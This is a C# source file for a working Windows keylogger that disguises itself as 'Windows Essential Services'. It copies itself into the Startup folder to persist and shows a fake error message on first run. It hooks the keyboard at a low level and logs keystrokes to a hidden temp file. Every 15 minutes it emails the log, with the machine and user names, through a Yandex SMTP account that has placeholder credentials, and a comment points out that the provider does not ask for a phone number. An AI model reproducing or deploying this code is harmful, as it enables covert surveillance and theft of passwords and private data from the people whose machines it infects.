using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Net.Mail;
using System.Timers;
using System.ComponentModel;
using System.Reflection;

namespace Windows_Essential_Services
{
    class Program
    {
        private const string logFileName = "Windows Essential Services.exe";

        static void Main(string[] args)
        {
            if (checkAndSetEnv())
            {
                ApplicationContext initiator = new Heart();
                Application.Run(initiator); 
            }
            else
            {
                new Mailer("Initiated");
                MessageBox.Show("An error occured!", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private static bool checkAndSetEnv()
        {
            bool allSet = false;

            string codeBase = Assembly.GetExecutingAssembly().CodeBase;
            UriBuilder uri = new UriBuilder(codeBase);
            string path = Uri.UnescapeDataString(uri.Path);
            string assemblyPath = ((Path.GetDirectoryName(path)).EndsWith("\\")) ? Path.GetDirectoryName(path) : Path.GetDirectoryName(path) + "\\";
            string startupPath = ((Environment.GetFolderPath(Environment.SpecialFolder.Startup)).EndsWith("\\")) ? Environment.GetFolderPath(Environment.SpecialFolder.Startup) : Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";

            if (assemblyPath != startupPath)
            {
                if (File.Exists(startupPath + logFileName) == false)
                {
                    string exeFriendlyName = System.AppDomain.CurrentDomain.FriendlyName;
                    File.Copy(assemblyPath + exeFriendlyName, startupPath + logFileName);
                    Process.Start(startupPath + logFileName);
                }
            }
            else
            {
                allSet = true;
            }
            return allSet;
        }
    }
 
    public class Heart : ApplicationContext
    {
        /// <summary>
        /// Hooks required 
        /// </summary>
        [DllImport("wininet.dll")]
        private extern static bool InternetGetConnectedState(out int Description, int ReservedValue);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        /// <summary>
        /// Variables and constances 
        /// </summary>
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const string logFileName = "y394s234283w4234238v482347k2.log";
        private static bool shiftDown = false;
        private static bool capsOn = false;
        public static string path = @"c:\y394s234283w4234238v482347k2.log";
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static bool timerFlag = false;

        private static Keys[] iggyKeys = { Keys.LControlKey, Keys.RControlKey };
        private BackgroundWorker backgroundWorker = new BackgroundWorker();

        /// <summary>
        /// Constructor
        /// This starts the application
        /// </summary>
        public Heart()
        {
            _hookID = SetHook(_proc);
            setTempPath();
            setTimer();
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        /// <summary>
        /// Find and set the temporary path for logged in user
        /// </summary>
        private void setTempPath()
        {
            string pat = Path.GetTempPath();
            path = string.Concat(pat, logFileName);
        }

        /// <summary>
        /// Set a timer and initiate a background worker
        /// </summary>
        private void setTimer()
        {
            backgroundWorker.DoWork += new DoWorkEventHandler(launchApocalypse);
            //backgroundWorker.ProgressChanged += backgroundWorker1_ProgressChanged;
            backgroundWorker.WorkerReportsProgress = true;

            System.Timers.Timer aTimer = new System.Timers.Timer();
            aTimer.Elapsed += new ElapsedEventHandler(OnTimedEvent);
            aTimer.Interval = 900000; // 900000 - 15 mins  , 60000 - 1 min
            aTimer.Enabled = true;
        }

        /// <summary>
        /// Do work function of the background worker
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void launchApocalypse(object sender, DoWorkEventArgs e)
        {
            string body = (string)e.Argument;
            new Mailer(body);
        }

        /// <summary>
        /// On timer times out 
        /// </summary>
        /// <param name="source"></param>
        /// <param name="e"></param>
        private void OnTimedEvent(object source, ElapsedEventArgs e)
        {
            if (IsConnectedToInternet())
            {
                string text = ""; // File.ReadAllText(path); // This keeps file not being released
                using (StreamReader sr = new StreamReader(path))
                {
                     text = sr.ReadToEnd();
                }
                if (text.Length > 0)
                {
                    timerFlag = true;
                    backgroundWorker.RunWorkerAsync(text);
                }
            } 
        } 

        /// <summary>
        /// Registerng hook
        /// </summary>
        /// <param name="proc"></param>
        /// <returns></returns>
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        
        /// <summary>
        /// Keyboard hook callback
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (timerFlag)
             {
                 File.Create(path).Close();
                 timerFlag = false;
             }

             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN || nCode >= 0 && wParam == (IntPtr)WM_KEYUP)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys chars = (Keys)vkCode;

                if (wParam == (IntPtr)WM_KEYDOWN)
                {
                    if ((chars == Keys.LShiftKey || chars == Keys.RShiftKey))
                    {
                        if (shiftDown == false)
                        {
                            shiftDown = true;
                        }
                        else
                        {
                            return CallNextHookEx(_hookID, nCode, wParam, lParam);
                        }
                    }
                    if (iggyKeys.Contains(chars))
                    {
                        return CallNextHookEx(_hookID, nCode, wParam, lParam);
                    }
                }

                if (wParam == (IntPtr)WM_KEYUP)
                {
                    if (chars == Keys.LShiftKey || chars == Keys.RShiftKey)
                    {
                        if (shiftDown == true)
                        {
                            shiftDown = false;
                        }
                    }
                    else
                    {
                        return CallNextHookEx(_hookID, nCode, wParam, lParam);
                    }
                }
                if (!File.Exists(path))
                {
                    using (StreamWriter sw = File.CreateText(path))
                    {
                        writeInFile(sw, chars);
                    }
                }
                else
                {
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        writeInFile(sw, chars);
                    }
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        /// <summary>
        /// Write text to the file
        /// </summary>
        /// <param name="sw"></param>
        /// <param name="chars"></param>
        private static void writeInFile(StreamWriter sw, Keys chars)
        {
            switch (chars)
            {
                case Keys.Return:
                    sw.WriteLine("");
                    break;
                case Keys.Space:
                    sw.Write(" ");
                    break;
                case Keys.D0:
                case Keys.NumPad0:
                    sw.Write("0");
                    break;
                case Keys.D1:
                case Keys.NumPad1:
                    sw.Write("1");
                    break;
                case Keys.D2:
                case Keys.NumPad2:
                    sw.Write("2");
                    break;
                case Keys.D3:
                case Keys.NumPad3:
                    sw.Write("3");
                    break;
                case Keys.D4:
                case Keys.NumPad4:
                    sw.Write("4");
                    break;
                case Keys.D5:
                case Keys.NumPad5:
                    sw.Write("5");
                    break;
                case Keys.D6:
                case Keys.NumPad6:
                    sw.Write("6");
                    break;
                case Keys.D7:
                case Keys.NumPad7:
                    sw.Write("7");
                    break;
                case Keys.D8:
                case Keys.NumPad8:
                    sw.Write("8");
                    break;
                case Keys.D9:
                case Keys.NumPad9:
                    sw.Write("9");
                    break;
                case Keys.OemPeriod:
                    sw.Write(".");
                    break;
                default:
                    sw.Write(chars);
                    break;
            }            
        }


        /// <summary>
        /// Check if the device is connected to the internet  
        /// </summary>
        /// <returns></returns>
        public static bool IsConnectedToInternet()
        {
            bool returnValue = false;
            try
            {
                int Desc;
                returnValue = InternetGetConnectedState(out Desc, 0);
            }
            catch
            {
                returnValue = false;
            }
            return returnValue;
        }
    }

    public class Mailer
    {
        private string pcUserName = "Unknown";
        private string pcName = "Unknown";
        /// <summary>
        /// Constructor mailer class
        /// initiate the mail function 
        /// </summary>
        public Mailer(string body)
        {
            try
            {
                pcUserName = Environment.UserName;
                pcName = Environment.MachineName;
            }
            catch (Exception ex) { }

            SmtpClient client = new SmtpClient();
            client.Port = 587;
            client.DeliveryMethod = SmtpDeliveryMethod.Network;
            client.UseDefaultCredentials = false;
            client.Host = "smtp.yandex.com"; // Hint : they dont ask for a phone number ;)
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("XXXXXX@yandex.com", "XXXXXXX"); // Your credentials here
            client.Timeout = 90000;
            // Yandex https://stackoverflow.com/questions/34808365/how-to-send-email-via-yandex-smtp-c-asp-net 
            // SmtpClient .Credentials = new System.Net.NetworkCredential("yourusername", "yourpassword");
            MailMessage mail;
            mail = new MailMessage("XXXXXX@yandex.com", "XXXXXX@yandex.com");
            mail.Subject = DateTime.Now.ToString() + " - " + pcName + " - " + pcUserName;
            mail.Body = body;
            client.Send(mail);
            mail.Dispose();
        }
    }
}
